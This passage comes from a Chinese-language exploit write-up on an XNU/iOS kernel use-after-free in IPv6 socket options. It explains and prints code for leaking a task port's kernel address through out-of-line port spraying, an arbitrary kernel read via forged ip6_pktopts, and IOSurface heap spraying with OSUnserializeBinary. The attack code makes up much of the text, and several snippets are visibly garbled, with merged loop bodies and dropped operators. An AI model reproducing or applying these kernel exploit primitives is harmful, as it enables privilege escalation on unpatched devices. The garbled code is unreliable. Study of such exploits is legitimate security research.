    {
        ipc_entry_t entry;
        is_write_lock(space);
        if ((entry = ipc_entry_lookup(space, name)) == IE_NULL) {
            is_write_unlock(space);
            return KERN_INVALID_NAME;
        }
        *entryp = entry;
        return KERN_SUCCESS;
    }
这里需要提两个概念，一个是结构体`ipc_space`，它是整个Task的IPC空间，另一个是结构体`ipc_entry`，它指向的是结构体`ipc_object`，结构体`ipc_space`有一个成员`is_table`专门用于存储当前Task所有的`ipc_entry`，在我们这里的场景，`ipc_entry`指向的是`ipc_port`，也就是说，变量`entry`拿到的是最开始传入的`Task
Port`在内核态的地址
    ipc_entry_t
    ipc_entry_lookup(
        ipc_space_t        space,
        mach_port_name_t    name)
    {
        mach_port_index_t index;
        ipc_entry_t entry;
        index = MACH_PORT_INDEX(name);
        if (index is_table_size) {
                    entry = &space->is_table[index];
            ...
        }
        return entry;
    }
层层往回走，函数`ipc_object_copyin()`的参数`objectp`会被存储到Caller函数`ipc_kmsg_copyin_ool_ports_descriptor()`的`objects[]`数组里，数组`objects[]`在函数`ipc_kmsg_copyin_ool_ports_descriptor`进行内存空间分配，所以我们只要让`ports_length`等于`inp->in6p_outputopts`的大小，就可以让它分配到我们释放掉的空间里
    data = kalloc(ports_length);
    objects = (ipc_object_t *) data;
我做了一张逻辑调用图，注意红框
先创建一个`Ports`数组用于存储传入的用户态`Task Port`，然后构造`OOL
Message`，其它都不重要，主要看`msg->ool_ports.address`和`msg->ool_ports.count`，这两个构造好就行，调用函数`msg_send()`发送消息，此时就会发生内存分配，将用户态`Task
Port`转为`Task Port`的内核态地址并写入我们可控的内存空间
    mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
        mach_port_t q = MACH_PORT_NULL;
        kern_return_t err;
        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
        mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
        for (int i = 0; i hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414141;
        msg->body.msgh_descriptor_count = 1;
        msg->ool_ports.address = ports;
        msg->ool_ports.count = count;
        msg->ool_ports.deallocate = 0;
        msg->ool_ports.disposition = disposition;
        msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       msg->hdr.msgh_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);
        return q;
    }
结构体`ip6_pktopts`的大小是`192`，我没找到对应的头文件来导入这个结构体，笨办法把整个结构体拷贝出来了，然后调用函数`sizeof()`来计算，这里根据结构体的成员分布，选择了`ip6po_minmtu`和`ip6po_prefer_tempaddr`进行组合，同时增加了内核指针特征进行判断
    uint64_t find_port_via_uaf(mach_port_t port, int disposition) {
        int sock = get_socket_with_dangling_options();
        for (int i = 0; i = 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
                mach_port_destroy(mach_task_self(), p);
                close(sock);
                return ptr;
            }
            mach_port_destroy(mach_task_self(), p);
        }
        close(sock);
        return 0;
    }
## 5\. 泄露IPC_SPACE内核地址
在泄露`Task
Port`内核态地址的时候，我们利用的是传输Port过程中内核自动将其转换为内核态地址的机制往可控的内存里填充数据，而想要泄露内核任意地址上的数据，就需要使用更加稳定的方式实现原语
首先来看结构体`ip6_pktopts`，现在有一个指针指向这一片已经释放掉的内核空间，我们通过某些方式可以让这片内核空间写上我们构造的数据，那么就有几个问题需要解决
  1. 怎么申请到这片内存并将数据写进去？
  2. 怎么利用写进去的数据实现内核任意地址读原语？
    struct    ip6_pktopts {
        struct    mbuf *ip6po_m;    /* Pointer to mbuf storing the data */
        int    ip6po_hlim;    /* Hoplimit for outgoing packets */
        struct    in6_pktinfo *ip6po_pktinfo;
        struct    ip6po_nhinfo ip6po_nhinfo;
        struct    ip6_hbh *ip6po_hbh; /* Hop-by-Hop options header */
        struct    ip6_dest *ip6po_dest1;
        struct    ip6po_rhinfo ip6po_rhinfo;
        struct    ip6_dest *ip6po_dest2;
        int    ip6po_tclass;    /* traffic class */
        int    ip6po_minmtu;  /* fragment vs PMTU discovery policy */
        int    ip6po_prefer_tempaddr;
        int ip6po_flags;
    };
第二个问题比较好解决，我们可以看到结构体`ip6_pktopts`有好几个结构体类型成员，比如结构体`ip6po_pktinfo`，那么我们就可以把这个结构体成员所在偏移设置为我们要泄露数据的地址，设置整型变量`ip6po_minmtu`为一个特定值，然后堆喷这个构造好的数据到内存里，利用函数`getsockopt()`读漏洞Socket的`ip6po_minmtu`是否为我们标记的特定值
如果是特定值说明这个漏洞Socket已经成功喷上了我们构造的数据，再通过函数`getsockopt()`读取结构体变量`ip6po_pktinfo`的值即可泄露出构造地址的数据，结构体`in6_pktinfo`的大小为20字节，所以作者实现了函数`read_20_via_uaf()`用于泄露指定地址的数据
    void* read_20_via_uaf(uint64_t addr) {
        int sockets[128];
        for (int i = 0; i ip6po_minmtu = 0x41424344; // 设置特征值
        *(uint32_t*)((uint64_t)fake_opts + 164) = 0x41424344;
        fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr; // 设置要读的内核地址
        bool found = false;
        int found_at = -1;
        for (int i = 0; i ip6po_pktinfo的数据
        void *buf = malloc(sizeof(struct in6_pktinfo));
        get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);
        close(sockets[found_at]);
        return buf;
    }
如何构造任意读的原语方法有了，剩下的关键就是如何将构造好的数据堆喷到`inp->in6p_outputopts`，我们来学习一种新的堆喷方式：利用`IOSurface`进行堆风水
关于序列化与反序列化相关的资料大家可以参考这篇文章的第二段`Overview of OSUnserializeBinary`，写的非常详细
  * [Analysis and exploitation of Pegasus kernel vulnerabilities (CVE-2016-4655 / CVE-2016-4656)](http://jndok.github.io/2016/10/04/pegasus-writeup/)
我这里以自己的理解作简单的记录
相关的有两个函数：`OSUnserializeBinary()`与`OSUnserializeXML()`
我们有两种模式可以构造数据，一种是XML，另一种是Binary，Binary模式是以`uint32`为类型的数据，当数据头部是`0x000000d3`的时候，就会自动跳到函数`OSUnserializeBinary()`处理
`uint32`长度是32位，也就是4个字节，第32位用于表示结束节点，第24位到30位表示存储的数据，第0到23位表示数据长度
**0(31) 0000000(24) 000000000000000000000000**
    #define kOSSerializeBinarySignature "\323\0\0" /* 0x000000d3 */
    enum {
        kOSSerializeDictionary      = 0x01000000U,
        kOSSerializeArray           = 0x02000000U,
        kOSSerializeSet             = 0x03000000U,
        kOSSerializeNumber          = 0x04000000U,
        kOSSerializeSymbol          = 0x08000000U,
        kOSSerializeString          = 0x09000000U,
        kOSSerializeData            = 0x0a000000U,
        kOSSerializeBoolean         = 0x0b000000U,
        kOSSerializeObject          = 0x0c000000U,
        kOSSerializeTypeMask        = 0x7F000000U,
        kOSSerializeDataMask        = 0x00FFFFFFU,
        kOSSerializeEndCollection   = 0x80000000U,
    };
举个例子来理解计算过程，`0x000000d3`表示这是Binary模式，`0x81000002`表示当前集合`kOSSerializeDictionary`内有两个元素，接下来依次填充元素，第一个元素是`kOSSerializeString`，元素长度是4，`0x00414141`表示元素数据，`kOSSerializeBoolean`表示第二个元素，最后一位直接可以表示`True`或者`False`
    0x000000d3 // kOSSerializeBinarySignature
    0x81000002 // kOSSerializeDictionary | 2 | kOSSerializeEndCollection
    0x09000004 // kOSSerializeString | 4
    0x00414141 // AAA
    0x8b000001 // kOSSerializeBoolean | 1 | kOSSerializeEndCollection
根据我们的分析，上面一段数据的解析结果如下，注意字符串类型最后的`00`截止符是会占位的
        AAA
        1
**这个计算过程一定要理解，接下来的堆喷需要用到这个计算方式**
作者使用函数`spray_IOSurface()`作为调用入口实现了堆喷，`32`表示尝试32次堆喷，`256`表示存储的数组元素个数
    int spray_IOSurface(void *data, size_t size) {
        return !IOSurface_spray_with_gc(32, 256, data, (uint32_t)size, NULL);
    }
函数`IOSurface_spray_with_gc()`作为封装，直接调用函数`IOSurface_spray_with_gc_internal()`，最后一个参数`callback`设置为`NULL`，此处不用处理
    bool
    IOSurface_spray_with_gc(uint32_t array_count, uint32_t array_length,
            void *data, uint32_t data_size,
            void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size)) {
        return IOSurface_spray_with_gc_internal(array_count, array_length, 0,
                data, data_size, callback);
    }
最终实现在函数`IOSurface_spray_with_gc_internal()`里，这个函数比较复杂，我们按照逻辑进行拆分
初始化`IOSurface`获取`IOSurfaceRootUserClient`
    bool ok = IOSurface_init();
计算每一个`data`所需要的`XML Unit`数量，因为`00`截止符的原因，`data_size`需要减去1再进行计算，其实就是向上取整
    size_t xml_units_per_data = xml_units_for_data_size(data_size);
    static size_t
    xml_units_for_data_size(size_t data_size) {
        return ((data_size - 1) + sizeof(uint32_t) - 1) / sizeof(uint32_t);
    }
比如字符串长度为3字节，加上`00`截止符就是4字节，需要1个`uint32`
    0x09000004 // kOSSerializeString | 4
    0x00414141 // AAA
那如果字符串长度是7字节，加上`00`截止符就是8字节，此时就需要2个`uint32`，也就是上面计算的`XML Unit`
    0x09000008 // kOSSerializeString | 4
    0x41414141 // AAAA
    0x00414141 // AAA
这里有很多个`1`，每个`1`都是一个`uint32`类型的数据，这个留着后面具体构造的时候再分析，这里计算的是一个完整的XML所需要的`XML
Unit`，其中包含了256个`data`，每个`data`所需要占用的`XML
Unit`为函数`xml_units_for_data_size()`计算的结果，此处加1操作是因为每个`data`需要一个`kOSSerializeString`作为元素标签，这个标签占用1个`uint32`
    size_t xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
上面计算完需要的`xml_units`之后，下面开始分配内存空间，`xml[0]`为变长数组
    struct IOSurfaceValueArgs {
        uint32_t surface_id;
        uint32_t _out1;
        union {
            uint32_t xml[0];
            char string[0];
        };
    };
    struct IOSurfaceValueArgs *args;
    size_t args_size = sizeof(*args) + xml_units * sizeof(args->xml[0]);
    args = malloc(args_size);
这是很重要的一步，此前计算的几个数据会在这里传入函数`serialize_IOSurface_data_array()`进行最终的`XML`构造
    uint32_t **xml_data = malloc(current_array_length * sizeof(*xml_data));
    uint32_t *key;
    size_t xml_size = serialize_IOSurface_data_array(args->xml, current_array_length, data_size, xml_data, &key);
函数`serialize_IOSurface_data_array()`的构造过程我们前面有详细的解释，前后6个`1`在这里体现为`kOSSerializeBinarySignature`等元素
    static size_t
    serialize_IOSurface_data_array(uint32_t *xml0, uint32_t array_length, uint32_t data_size,
            uint32_t **xml_data, uint32_t **key) {
        uint32_t *xml = xml0;
        *xml++ = kOSSerializeBinarySignature;
        *xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;
        *xml++ = kOSSerializeArray | array_length;
        for (size_t i = 0; i < array_length; i++) {
            uint32_t flags = (i == array_length - 1 ? kOSSerializeEndCollection : 0);
            *xml++ = kOSSerializeData | (data_size - 1) | flags;
            xml_data[i] = xml;    // 记录当前偏移，后续用于填充data
            xml += xml_units_for_data_size(data_size);
        }
        *xml++ = kOSSerializeSymbol | sizeof(uint32_t) + 1 | kOSSerializeEndCollection;
        *key = xml++;        // This will be filled in on each array loop.
        *xml++ = 0;        // Null-terminate the symbol.
        return (xml - xml0) * sizeof(*xml);